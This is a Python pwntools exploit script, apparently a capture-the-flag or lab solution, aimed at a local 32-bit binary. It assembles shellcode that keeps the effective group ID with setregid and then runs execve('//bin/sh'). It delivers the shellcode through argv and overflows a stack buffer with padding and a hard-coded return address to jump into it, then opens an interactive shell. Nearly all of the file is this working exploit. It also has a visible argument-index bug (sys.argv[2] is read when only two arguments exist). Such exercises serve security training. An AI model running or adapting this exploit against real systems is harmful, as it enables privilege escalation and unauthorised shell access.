#!/usr/bin/env python
from pwn import *
import pwn
import helpers

########################################################
# Setup
########################################################
prog = './'
if len(sys.argv) == 2:
  prog += sys.argv[2]
else:
  prog += os.path.basename(os.getcwd())
  prog = prog[:2] + prog[5:]

elf = pwn.ELF(prog)

########################################################
# Exploit                                              #
########################################################
arch = 'i386'
shellcode = '''
    .att_syntax
    .att_mnemonic

    // write your assembly here
    // clear register
    xor %eax, %eax
    xor %ebx, %ebx
    xor %ecx, %ecx

    // setregid(getegid(), getegid())
    // arg0: getegid(); arg1: getegid()
    push $0x32
    pop %eax
    int $0x80
    mov %eax, %ebx
    mov %eax, %ecx

    // call setregid(arg1, arg2)
    push $0x47
    pop %eax
    int $0x80
    
    // execve('//bin/sh', 0, 0)
    // clear out registers
    xor %edx, %edx
    xor %ecx, %ecx
    xor %ebx, %ebx

    // arg0: '//bin/sh'
    push %ebx
    push $0x68732f6e
    push $0x69622f2f
    mov %esp, %ebx

    // execve(arg0, arg1, arg2)
    push $0x0b
    pop %eax
    int $0x80
'''
compiled = asm(shellcode, arch=arch)

# provides a compiled as shellcode as an argv
target = process([prog, compiled]) 

# padding
padding = ''
for letter in 'abcd':
  padding += letter*4
padding = bytearray(padding, 'utf-8')

ret = b'\xf9\xd6\xff\xff'

# pads all to $ebp and then redirects the program to
# to argv
payload = padding + ret

########################################################
# Execution                                            #
########################################################
#flag = helpers.get_flag(elf, payload, env)
#pwn.info(f'Flag: {flag}')
target.send(payload)
target.interactive()
